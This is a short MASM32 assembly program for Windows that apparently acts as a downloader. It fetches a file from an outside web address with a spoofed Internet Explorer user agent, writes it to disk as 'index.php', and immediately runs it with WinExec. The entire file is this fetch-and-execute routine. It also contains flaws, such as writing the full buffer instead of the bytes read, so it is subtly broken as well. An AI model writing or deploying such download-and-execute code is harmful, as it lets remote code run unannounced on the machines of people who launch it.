.386
.model flat,stdcall
option casemap:none


include \masm32\include\windows.inc
include \masm32\include\kernel32.inc
include \masm32\include\wininet.inc
include \masm32\include\user32.inc
includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\wininet.lib
includelib \masm32\lib\user32.lib




WebDl      PROTO :DWORD,:DWORD
.data
    WebUrl     db 'http://www.illmob.org/index.php',0, 255 dup(0)
    TheExe     db 'index.php',0,0,0,0,0,0
.data?
    Buffer db 256 dup(?)
.code

start:
    invoke WebDl, addr WebUrl, addr TheExe
    invoke WinExec, addr TheExe, SW_SHOW
     invoke ExitProcess, 0




WebDl PROC lpWebUrl:DWORD, lpszFile:DWORD
    local hInternet:DWORD
    local hURL:DWORD
    local hFile:DWORD
    local lpBuffer[1024]:BYTE
    local BufferLen:DWORD
    local BytesWrite:DWORD
    jmp @F
    lpszAgent DB "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)",0
    @@:
    invoke InternetOpen, addr lpszAgent, INTERNET_OPEN_TYPE_PRECONFIG, 0, 0, 0
    cmp eax, 0
    jz done
    mov hInternet, eax
    invoke InternetOpenUrl, hInternet, lpWebUrl, 0, 0, 0, 0
    cmp eax, 0
    jz done
    mov hURL, eax
    invoke CreateFile, lpszFile, GENERIC_WRITE, FILE_SHARE_READ, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0
    mov hFile, eax
    .repeat
        invoke InternetReadFile, hURL, addr lpBuffer, sizeof lpBuffer, addr BufferLen
        cmp eax, 0
        jz done
        invoke WriteFile, hFile, addr lpBuffer, sizeof lpBuffer, addr BytesWrite, 0
    .until BufferLen==0
    invoke CloseHandle, hFile
    invoke InternetCloseHandle, hURL
    cmp eax, 0
    jz done
    invoke InternetCloseHandle, hInternet
     done:
    xor eax, eax
    inc eax
    ret    
WebDl ENDP
end start
